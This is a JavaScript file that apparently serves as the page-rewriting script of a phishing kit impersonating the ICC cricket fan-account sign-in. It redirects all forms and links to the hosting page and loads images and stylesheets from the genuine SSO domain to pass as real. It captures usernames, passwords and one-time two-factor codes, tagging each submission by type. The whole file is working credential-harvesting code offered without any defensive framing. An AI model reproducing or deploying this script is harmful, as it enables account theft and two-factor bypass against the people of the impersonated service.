let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})

let URL = "https://sso.fanaccount.icc-cricket.com"
document.querySelectorAll("link").forEach(li => {
    let prev = li.href
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.href = `${URL}${prev}`
    }
})

document.querySelectorAll("img").forEach(li => {
    let prev = li.src
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.src = `${URL}${prev}`
    }
})


// sets
let username = document.querySelector("#username")
let password = document.querySelector("#password")
// set 
let submitAction = document.querySelector("#submitAction")

// set 
if (username && password) {
    addSpikeType("login")
}
else if (sign_in_totp_code) {
    addSpikeType("otp_code")
}

submitAction.type = "button"
submitAction.addEventListener("click", () => {
    if (username.value.includes("@") && password.value.length > 0) {
        submitAction.type = "submit"
    }
})


// functions
let rememberMe = document.querySelector("#rememberMe")

if (rememberMe) {
    rememberMe.required = false
}

let showPassBtn = document.querySelector(`#showPassword`)

let showPass = false
if (showPassBtn) {
    showPassBtn.addEventListener("click", () => {
        if (showPass == false) {
            password.type = "text"
            showPass = true
        } else {
            password.type = "password"
            showPass = false
        }
    })
}